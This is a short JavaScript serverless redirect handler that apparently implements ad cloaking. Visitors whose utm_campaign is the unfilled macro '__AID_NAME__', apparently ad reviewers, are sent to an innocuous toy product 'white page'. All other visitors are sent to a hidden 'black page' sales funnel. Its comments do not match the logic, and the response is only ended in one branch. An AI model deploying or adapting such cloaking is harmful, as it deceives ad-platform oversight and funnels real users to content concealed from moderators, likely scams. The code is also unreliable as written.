export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://swellyusa.com/products/copy-of-yuru-yuru-dino-plush-small-t-rex-red";
    const blackPageURL = "https://SiImUqRhJu.myfunnelish.com/shwards";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
   // Redirection logic
   if (utmCampaign === '__AID_NAME__') {
    // UTM campaign 'l1' takes priority for both desktop and mobile
    res.writeHead(302, { Location: whitePageURL });
  } else{
    // Mobile devices without 'l1' campaign
    res.writeHead(302, { Location: blackPageURL });

  res.end();
}}